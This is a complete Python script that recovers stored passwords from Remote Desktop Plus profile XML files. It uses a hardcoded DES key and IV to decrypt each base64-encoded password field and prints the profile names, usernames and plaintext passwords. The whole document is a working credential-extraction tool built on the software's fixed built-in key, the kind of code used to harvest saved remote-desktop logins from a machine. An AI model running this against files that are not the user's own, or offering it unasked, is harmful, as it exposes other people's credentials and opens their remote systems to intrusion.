from Crypto.Cipher import DES
from Crypto.Util.Padding import unpad
import base64
import argparse
import xml.etree.ElementTree as ET

def decrypt_password(encrypted_password):
    key = bytes.fromhex("44f6e6b65697f535")
    iv = bytes.fromhex("86f6470032031312")
    cipher = DES.new(key, DES.MODE_CBC, IV=iv)
    decrypted_password = unpad(cipher.decrypt(encrypted_password), 8).decode("utf-16le")
    return decrypted_password

def process_xml_profiles(file_path):
    try:
        tree = ET.parse(file_path)
        root = tree.getroot()

        for profile in root.findall('Profile'):
            profile_name = profile.find('ProfileName').text
            user_name = profile.find('UserName').text
            encrypted_password_b64 = profile.find('Password').text
            encrypted_password = base64.b64decode(encrypted_password_b64)

            decrypted_password = decrypt_password(encrypted_password)
            print(f"Profile: {profile_name}, Username: {user_name}, Password: {decrypted_password}")
    except ET.ParseError:
        print("Error parsing the XML file. Please check the file format.")
    except FileNotFoundError:
        print("File not found. Please check the file path.")

parser = argparse.ArgumentParser(description="Recover passwords from Remote Desktop Plus profiles")
parser.add_argument("--password", help="Encrypted password (base64 encoded)")
parser.add_argument("--profiles", help="Path to Remote Desktop Plus profile XML file")

args = parser.parse_args()

if args.password:
    encrypted_password = base64.b64decode(args.password)
    password = decrypt_password(encrypted_password)
    print(f"Password: {password}")
elif args.profiles:
    process_xml_profiles(args.profiles)
else:
    print("Please provide either an encrypted password (--password) or a profiles path (--profiles).")
